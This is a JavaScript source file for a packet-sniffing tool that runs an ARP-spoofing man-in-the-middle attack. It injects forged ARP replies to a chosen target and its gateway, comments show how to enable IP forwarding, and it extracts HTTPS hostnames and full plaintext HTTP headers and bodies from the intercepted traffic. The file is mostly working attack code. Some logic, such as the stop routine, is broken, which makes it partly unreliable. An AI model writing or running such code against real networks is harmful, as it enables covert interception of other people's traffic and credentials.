const pcap = require('pcap')
const fs = require('fs')
const pcapFilters = require('./pcap-filters')
const tlsClientHello = require('is-tls-client-hello')
const sni = require('sni')
//sudo sysctl -w net.inet.ip.forwarding=1
//sudo sysctl -w net.inet.ip.fw.enable=1
//https://www.npmjs.com/package/electron-sudo
class PcapSniffer {

  constructor () {
    this.name = 'PcapSniffer'
    this.sniff = false
    this._if = 'en0'
    this.initComplete = false;
    this._client = null
    this.arpInterval = null
    this.arpTarget = null
    try{
      this.session = pcap.createSession(this._if, pcapFilters.https)
    }
    catch(err){
      this.session = null
    }
  }

  info (msg){
    console.log(`[${this.name}] : ${msg}`)
  }

  error (msg){
    console.log(`[${this.name} - Err] : ${msg}`)
  }

  set client(socket) {
    this._client = socket
  }

  get client() {
    return this._client
  }

  init (){
    if(this.session && !this.initComplete){
      this.session.on('packet', this._cb.bind(this))
      this.initComplete = true
    }
    if(this.session === null){
      if(this._client){
        this._client.emit('bpfError');
      }
      else{
        this.error('Client socket not found!')
      }
    }
  }

  start (socket) {
    this.sniff = true
  }

  stop (socket) {
    this.sniff = false
    this.stopArpSpoof()
  }

  startArpSpoof (params) {
    if(!this.arpInterval){
      this.arpInterval = setInterval(() => {
        this.arpPack(params.toTarget)
        this.arpPack(params.toRouter)
      }, 5000)
    this.info(`Start arp spoof. target:${params.toRouter.src_ip}`)
    this.arpTarget = params.toRouter.src_ip
    }
    else{
      this.info(`Spoof already running. clearing current spoof and restarting`)
      clearInterval(this.arpInterval)
        this.arpInterval = setInterval(() => {
        this.arpPack(params.toRouter)
        this.arpPack(params.toTarget)
        }, 5000)
      this.arpInterval = null
      this.arpTarget = null
      this.startArpSpoof(params)
    }
  }

  stopArpSpoof () {
    if(!this.arpInterval){
      this.info(`Stop arp spoof`)
      clearInterval(this.arpInterval)
      this.arpInterval = null
      this.arpTarget = null
    }
  }

  updateTarget (socket, d) {
    let params = {}
    params.toRouter = {
      src_ip: d.target_ip,
      src_mac: d.self_mac,
      target_ip: d.gw_ip,
      target_mac: d.gw_mac
    }

    params.toTarget = {
      src_ip:d.gw_ip,
      src_mac:d.self_mac,
      target_ip:d.target_ip,
      target_mac:d.target_mac
    }
    this.startArpSpoof(params)
  }
// src ip  (the IP you're targetting )
// src mac (your OWN mac address)
// target ip : gw (the node youre telling)
// target mac: gw (the node youre telling)

  arpPack (config={ src_ip:"192.168.1.35",
                    src_mac:"60:03:08:93:6b:ba",
                    target_ip:"192.168.1.1",
                    target_mac:"6c:72:20:6b:89:44"})
  {
    let pkt_config = {
            'op': 'request',
            'src_ip': config.src_ip,
            'src_mac': config.src_mac,
            'dst_ip': config.target_ip,
            'dst_mac': config.target_mac
            }

    let pkt = {};
    pkt.dst = this.mac_to_arr("ff:ff:ff:ff:ff:ff");
    pkt.src = this.mac_to_arr(pkt_config.src_mac);

    // ARP
    pkt.ether_type = [0x08, 0x06];
    pkt.hw_type = [0x00, 0x01];
    pkt.proto_type = [0x08, 0x00];
    pkt.hw_len = [0x06];
    pkt.proto_len = [0x04];
    pkt.op = [0x00, 0x02];

    pkt.src_mac = this.mac_to_arr(pkt_config.src_mac);
    pkt.src_ip = this.ip_to_arr(pkt_config.src_ip);
    pkt.dst_mac = this.mac_to_arr(pkt_config.dst_mac);
    pkt.dst_ip = this.ip_to_arr(pkt_config.dst_ip);

    var x;
    var pktArr = [];
    for (x in pkt) {
      pktArr = pktArr.concat(pkt[x]);
    }

    var arpRequest = new Buffer(pktArr);
    this.session.inject(arpRequest);
  }

  _cb (raw) {
    const packet = pcap.decode.packet(raw)
    const parsed = this._parse(packet, raw)
    if(this._client && parsed){
      this._client.emit('newPacket', parsed);
    }
  }

  _parse (packet, raw) {
    const ts = packet.pcap_header.tv_sec
    const eth = packet.payload
    const ip = eth.payload
    const tcp = ip.payload

    if( tcp.sport === 8443 ||
        tcp.sport === 443  ||
        tcp.dport === 443  ||
        tcp.dport === 8443 ){
      if(tcp.data){
        if(tlsClientHello(tcp.data)){
          return  { ts: ts, eth: eth, ip: ip, tcp: tcp, payload: {type:'https', host:sni(tcp.data)}}
        }
      }
      return false
    }
    if(this.arpTarget){

    }
    if(!tcp.data){
      return false;
    }

    let r = tcp.data.toString('utf-8')
    if(r.indexOf('Content-Length') === -1 &&
        r.indexOf('Host') === -1 &&
        r.indexOf('Content-Type') === -1 ){
      return false;
    }

    let httpr = r.split('\r\n')
    try{
      return  { ts: ts, eth: eth, ip: ip, tcp: tcp, payload: this.parseHTTP(httpr)}
    }
    catch(err){
      this.error(err)
      return false
    }
  }

  mac_to_arr(macAddr) {
    var mac_arr = macAddr.split(':');
    var x;
    for (x in mac_arr) {
      mac_arr[x] = '0x' + mac_arr[x];
    }
    return mac_arr;
  }


  ip_to_arr(ipAddr) {
    var ip_arr = ipAddr.split('.');
    var x;
    for (x in ip_arr) {
      ip_arr[x] = ip_arr[x];
    }
    return ip_arr;
  }

  parseHTTP(headers){
    let packet = {}
    packet.http = true
    packet.host = ''
    let firstline = headers.shift()
    if( firstline.indexOf('GET') > -1 ||
        firstline.indexOf('POST') > -1 ||
        firstline.indexOf('PUT') > -1){
      let [verb, url, version] = firstline.split(' ')
      packet.type = 'request'
      packet.method = verb
      packet.url = url
      packet.version = version
    }
    else{
      let [version, code, status] = firstline.split(' ')
      packet.type = 'response '
      packet.code = code
      packet.status = status
      packet.version = version
    }

    packet.headers = []

    for (var i = 0; i < headers.length; i++) {
      if(headers[i] === ''){
        break;
      }

      let header = headers[i].split(': ')
      if(header.length <2 ){
        continue
      }
      else{
        if(header[0].indexOf('Host') > -1){
          packet.host = header[1]
        }
        packet.headers.push([header[0], header[1]])
      }
    }

    let lastline =  headers.pop()
    packet.payload = lastline
    return packet
  }

}

module.exports = PcapSniffer

    // for (var i = 0; i < httpHeaders.length; i++) {
    //   //;

    //   httpHeaders[i] = httpHeaders[i].replace(/[\x00-\xFF]/, "")//(/[^A-Za-z 0-9 \.,\?""!@#\$%\^&\*\(\)-_=\+;:<>\/\\\|\}\{\[\]`~]*/g, '') ;
    //   // if(httpHeaders[i].search(/(\\u\d{4})/) > -1){
    //   //   console.log()
    //   // }
    // }

    // console.log(httpHeaders)
//
// /[^\000-\031]+/
